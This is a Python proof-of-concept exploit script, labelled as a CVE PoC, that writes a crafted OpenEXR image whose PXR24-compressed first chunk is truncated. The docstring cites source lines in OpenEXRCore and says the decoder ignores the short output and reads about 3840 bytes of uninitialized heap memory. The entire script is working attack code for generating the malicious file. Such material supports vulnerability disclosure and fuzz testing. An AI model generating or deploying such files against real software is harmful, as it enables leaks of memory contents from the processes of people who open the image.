#!/usr/bin/env python3
"""
CVE PoC: OpenEXR PXR24 Heap-Uninitialized-Read via truncated zlib stream.

src/lib/OpenEXRCore/compression.c:202  - LIBDEFLATE_SHORT_OUTPUT → SUCCESS
src/lib/OpenEXRCore/internal_pxr24.c:286 - outSize (actual decompressed len) ignored
"""
import struct, zlib, sys

W, H, BPP = 64, 64, 4          # UINT channel
LPC       = 16                  # PXR24 lines-per-chunk
NCHUNKS   = H // LPC            # 4
UNCOMP    = W * LPC * BPP       # 4096 expected per chunk

def exr_attr(name, typename, data):
    return name.encode() + b'\x00' + typename.encode() + b'\x00' + struct.pack('<I', len(data)) + data

def main():
    b = bytearray()
    b += struct.pack('<II', 20000630, 2)  # magic + version

    # -- header --
    ch = b'R\x00' + struct.pack('<I', 0) + b'\x00\x00\x00\x00' + struct.pack('<II', 1, 1) + b'\x00'
    b += exr_attr('channels',          'chlist',      bytes(ch))
    b += exr_attr('compression',       'compression', struct.pack('<B', 5))          # PXR24
    b += exr_attr('dataWindow',        'box2i',       struct.pack('<4i', 0,0,W-1,H-1))
    b += exr_attr('displayWindow',     'box2i',       struct.pack('<4i', 0,0,W-1,H-1))
    b += exr_attr('lineOrder',         'lineOrder',   struct.pack('<B', 0))
    b += exr_attr('pixelAspectRatio',  'float',       struct.pack('<f', 1.0))
    b += exr_attr('screenWindowCenter','v2f',          struct.pack('<ff', 0.0, 0.0))
    b += exr_attr('screenWindowWidth', 'float',       struct.pack('<f', 1.0))
    b += b'\x00'  # end-of-header

    # -- offset table --
    ot = len(b)
    b += b'\x00' * (NCHUNKS * 8)

    # -- chunks --
    for i in range(NCHUNKS):
        struct.pack_into('<Q', b, ot + i*8, len(b))
        y = i * LPC
        if i == 0:
            # Truncated: only 256 B decompressed, decoder expects 4096 B → 3840 B heap leak
            raw = zlib.compress(b'\x00' * (W * BPP), 6)
        else:
            raw = zlib.compress(b'\x00' * UNCOMP, 6)
        b += struct.pack('<ii', y, len(raw)) + raw

    out = sys.argv[1] if len(sys.argv) > 1 else '/poc/pxr24_heap_oob.exr'
    open(out, 'wb').write(b)

if __name__ == '__main__':
    main()
